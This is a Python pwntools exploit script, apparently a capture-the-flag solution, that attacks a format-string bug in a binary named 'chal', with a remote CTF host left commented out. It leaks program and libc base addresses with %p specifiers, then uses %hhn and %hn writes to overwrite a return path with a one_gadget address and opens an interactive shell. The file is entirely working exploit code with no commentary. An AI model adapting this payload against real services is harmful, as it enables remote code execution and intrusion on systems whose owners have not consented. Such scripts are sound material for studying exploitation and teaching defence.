from pwn import *
import sys

elf = ELF("chal")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

io = process(elf.path)
# io = remote("printf.ctf.maplebacon.org", 1337)

# gdb.attach(io)

one_gadget1 = 0xe3afe
one_gadget2 = 0xe3b01
one_gadget3 = 0xe3b04

payload = b"%c" * 4
payload += b"%52c"
payload += b"%hhn"
payload += b"%17c"
payload += b"%8$hhn"
payload += b"%11$p"
payload += b"AAAA"
payload += b"%13$p"
payload += b"AAAA"
io.sendline(payload)

ret = io.recvuntil(b"AAAA")
elf.address = int(ret[-16:-4].decode(), 16) - 68 - elf.sym["main"]
ret = io.recvuntil(b"AAAA")
libc.address = int(ret[-16:-4].decode(), 16) - 243 - libc.sym["__libc_start_main"]
print("elf addr: " + str(hex(elf.address)))
print("libc addr: " + str(hex(libc.address)))

b = (((libc.address + one_gadget2) >> 16) & 0xff) - 90
payload =  b"%c" * 4
payload += b"%86c"
payload += b"%hhn"
payload += b"%%%dc%%hhn" % b
b = ((elf.sym["main"] + 63) & 0xffff) - b - 90
payload += b"%%%dc%%hn" % b
io.sendline(payload)

b = ((libc.address + one_gadget2) & 0xffff) - 88
payload =  b"%c" * 4
payload += b"%84c"
payload += b"%hhn"
payload += b"%%%dc%%hn" % b
io.sendline(payload)

io.interactive()